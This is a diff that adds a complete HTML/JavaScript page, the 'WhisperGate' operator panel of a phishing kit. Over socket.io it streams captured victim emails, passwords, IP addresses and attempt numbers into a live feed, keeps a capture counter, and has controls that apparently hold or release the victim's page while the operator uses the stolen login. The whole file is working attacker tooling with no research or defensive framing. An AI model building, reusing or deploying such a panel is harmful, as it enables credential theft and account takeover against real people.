@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhisperGate — Operator Panel</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
+  <style>
+    :root {
+      --bg: #0d1117;
+      --card: #161b22;
+      --border: #30363d;
+      --text: #e6edf3;
+      --text-dim: #8b949e;
+      --accent: #58a6ff;
+      --green: #3fb950;
+      --orange: #d29922;
+      --red: #f85149;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: "Consolas", "Courier New", monospace; background: var(--bg); color: var(--text); min-height: 100vh; padding: 24px; }
+
+    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
+    .header h1 { font-size: 18px; font-weight: 600; }
+    .header h1 span { color: var(--accent); }
+    .status-dot { display: inline-block; width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-right: 8px; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+    .grid { display: grid; grid-template-columns: 1fr 320px; gap: 24px; }
+
+    /* Credential feed */
+    .feed { background: var(--card); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; }
+    .feed-header { padding: 12px 16px; border-bottom: 1px solid var(--border); font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-dim); }
+    .feed-body { max-height: 70vh; overflow-y: auto; }
+    .feed-empty { padding: 40px 16px; text-align: center; color: var(--text-dim); font-size: 13px; }
+
+    .cred-entry { padding: 14px 16px; border-bottom: 1px solid var(--border); animation: slideIn 0.3s ease; }
+    .cred-entry:last-child { border-bottom: none; }
+    @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+    .cred-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
+    .cred-email { font-size: 14px; font-weight: 600; color: var(--accent); }
+    .cred-time { font-size: 11px; color: var(--text-dim); }
+    .cred-pass { font-size: 13px; color: var(--text); margin: 4px 0; }
+    .cred-pass code { background: rgba(88,166,255,0.1); padding: 2px 6px; border-radius: 3px; }
+    .cred-meta { font-size: 11px; color: var(--text-dim); }
+    .cred-attempt { display: inline-block; font-size: 10px; padding: 1px 6px; border-radius: 3px; margin-left: 6px; }
+    .attempt-1 { background: rgba(248,81,73,0.15); color: var(--red); }
+    .attempt-2 { background: rgba(63,185,80,0.15); color: var(--green); }
+
+    /* Controls */
+    .controls { display: flex; flex-direction: column; gap: 16px; }
+    .ctrl-card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 16px; }
+    .ctrl-card h3 { font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-dim); margin-bottom: 12px; }
+    .ctrl-btn { display: block; width: 100%; padding: 10px; font-size: 13px; font-weight: 600; font-family: inherit; border: 1px solid var(--border); border-radius: 4px; cursor: pointer; transition: all 0.15s; margin-bottom: 8px; }
+    .ctrl-btn:last-child { margin-bottom: 0; }
+    .ctrl-btn-extend { background: rgba(210,153,34,0.1); color: var(--orange); border-color: var(--orange); }
+    .ctrl-btn-extend:hover { background: rgba(210,153,34,0.2); }
+    .ctrl-btn-force { background: rgba(63,185,80,0.1); color: var(--green); border-color: var(--green); }
+    .ctrl-btn-force:hover { background: rgba(63,185,80,0.2); }
+
+    .log-line { font-size: 11px; color: var(--text-dim); padding: 4px 0; border-bottom: 1px solid rgba(48,54,61,0.5); }
+    .log-body { max-height: 200px; overflow-y: auto; }
+
+    .counter { font-size: 36px; font-weight: 700; color: var(--accent); text-align: center; margin: 8px 0; }
+    .counter-label { font-size: 11px; color: var(--text-dim); text-align: center; }
+
+    @media (max-width: 768px) {
+      .grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1><span>WhisperGate</span> Operator Panel</h1>
+    <div><span class="status-dot"></span><span style="font-size:12px;color:var(--text-dim)">Connected</span></div>
+  </div>
+
+  <div class="grid">
+    <div class="feed">
+      <div class="feed-header">Live Credential Feed</div>
+      <div class="feed-body" id="feedBody">
+        <div class="feed-empty" id="feedEmpty">Waiting for credentials...</div>
+      </div>
+    </div>
+
+    <div class="controls">
+      <div class="ctrl-card">
+        <h3>Captures</h3>
+        <div class="counter" id="credCount">0</div>
+        <div class="counter-label">Total credentials captured</div>
+      </div>
+
+      <div class="ctrl-card">
+        <h3>Hold Timer Controls</h3>
+        <button class="ctrl-btn ctrl-btn-extend" onclick="extendHold(15000)">+15s Hold</button>
+        <button class="ctrl-btn ctrl-btn-extend" onclick="extendHold(30000)">+30s Hold</button>
+        <button class="ctrl-btn ctrl-btn-extend" onclick="extendHold(60000)">+60s Hold</button>
+        <button class="ctrl-btn ctrl-btn-force" onclick="forceNext()">Force Next (Release)</button>
+      </div>
+
+      <div class="ctrl-card">
+        <h3>Event Log</h3>
+        <div class="log-body" id="logBody"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    var socket = io('/operator');
+    var count = 0;
+
+    function addLog(msg) {
+      var el = document.getElementById('logBody');
+      var d = document.createElement('div');
+      d.className = 'log-line';
+      var t = new Date().toLocaleTimeString();
+      d.textContent = '[' + t + '] ' + msg;
+      el.insertBefore(d, el.firstChild);
+    }
+
+    socket.on('connect', function() {
+      addLog('Connected to server');
+    });
+
+    socket.on('credential', function(data) {
+      count++;
+      document.getElementById('credCount').textContent = count;
+      document.getElementById('feedEmpty').style.display = 'none';
+
+      var el = document.createElement('div');
+      el.className = 'cred-entry';
+      el.innerHTML =
+        '<div class="cred-row">' +
+          '<span class="cred-email">' + esc(data.email) + '</span>' +
+          '<span class="cred-time">' + esc(data.timestamp) + '</span>' +
+        '</div>' +
+        '<div class="cred-pass">Password: <code>' + esc(data.password) + '</code>' +
+          '<span class="cred-attempt attempt-' + data.attempt + '">Attempt #' + data.attempt + '</span>' +
+        '</div>' +
+        '<div class="cred-meta">IP: ' + esc(data.ip) + '</div>';
+
+      var body = document.getElementById('feedBody');
+      body.insertBefore(el, body.firstChild);
+      addLog('Credential captured: ' + data.email + ' (attempt #' + data.attempt + ')');
+    });
+
+    function extendHold(ms) {
+      socket.emit('extend_hold', { ms: ms });
+      addLog('Extended hold by ' + (ms / 1000) + 's');
+    }
+
+    function forceNext() {
+      socket.emit('trigger_next');
+      addLog('Forced Next button');
+    }
+
+    function esc(s) {
+      var d = document.createElement('div');
+      d.textContent = s;
+      return d.innerHTML;
+    }
+  </script>
+</body>
+</html>
